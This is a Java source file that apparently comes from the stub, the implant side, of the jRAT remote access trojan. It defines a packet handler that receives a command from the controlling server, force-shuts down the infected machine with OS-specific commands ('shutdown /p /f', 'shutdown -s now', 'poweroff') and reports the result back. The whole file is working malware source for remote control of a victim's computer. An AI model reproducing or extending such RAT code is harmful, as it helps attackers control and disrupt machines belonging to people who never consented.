package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Constants;

import com.redpois0n.oslib.OperatingSystem;

public class Packet28ShutdownComputer extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		try {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec("shutdown /p /f");
			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
				Runtime.getRuntime().exec("shutdown -s now");
			} else {
				Runtime.getRuntime().exec("poweroff");
			} 
			
			Connection.instance.status(Constants.STATUS_STARTING_SHUTDOWN);
		} catch (Exception ex) {
			ex.printStackTrace();
			Connection.instance.status(Constants.STATUS_FAILED_SHUTDOWN);
		}
	}

}
